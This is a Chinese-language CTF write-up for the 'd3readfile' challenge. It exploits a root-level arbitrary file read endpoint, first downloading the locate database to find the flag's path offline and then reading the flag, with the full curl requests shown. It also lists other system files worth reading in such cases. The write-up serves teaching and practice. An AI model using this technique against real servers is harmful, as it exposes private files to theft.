# d3readfile

## 题目简述

题目是任意文件读取利用。服务端只有一个以 root 权限读文件的接口，但不知道 flag 具体路径。解法不是盲猜目录，而是读取 `locate` 的数据库 `/var/cache/locate/locatedb`，在本地用 `locate -d` 搜索 flag 路径，再通过同一个任意读接口读取 flag。

## 解题过程

这个 Web 服务是基于 flamego 的简单服务，唯一的路由用于以 root 权限读取任意文件。

在很多场景下，任意文件读取漏洞只能读文件，不能遍历目录。当我们想下载 Web 源码或寻找某个特定文件，但无法列目录时，可以尝试读取 `locate` 命令的数据库文件。该路径通常固定，读出后就能在本地环境中搜索目标文件路径。

**P.S.** `locate` 命令通常内置于 RedHat 系列操作系统，例如 CentOS 和 RHEL；在 Debian 系列或其他发行版中一般需要手动安装。

`locate` 命令会维护一个数据库，用来存储目录和文件信息。该数据库通常由每天运行一次的 `updatedb` crontab 任务保证及时性。执行 `locate` 命令时，它会读取该数据库来高效查找文件。

本题基于 Debian，并且安装了 `locate` 包。默认数据库位置是 `/var/cache/locate/locatedb`，只有 root 权限可以读取。我们可以先读出这个文件，再在本地用 `locate` 搜索 flag。

```
## 下载 locatedb。
#> curl 'http://<target>/readfile' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'filepath=/var/cache/locate/locatedb' \
  -o locatedb
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 70645    0 70610  100    35   351k    178 --:--:-- --:--:-- --:--:--  351k
#> locate -d locatedb flag
/opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2
KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233
#> curl 'http://<target>/readfile' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw
'filepath=/opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi
/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233'
antd3ctf{xxx}
```

## 方法总结

- 核心技巧：任意文件读、读取 `locate` 数据库、离线枚举目标文件路径。
- 识别信号：只有文件读取能力但没有目录遍历/路径泄露时，应优先找系统索引数据库、包管理数据库、Web 日志、shell history 等“路径目录”类文件。
- 复用要点：`locatedb` 默认位置常见为 `/var/cache/locate/locatedb`，是否存在取决于发行版和是否安装 `locate`；读到数据库后用 `locate -d locatedb <keyword>` 本地查询。
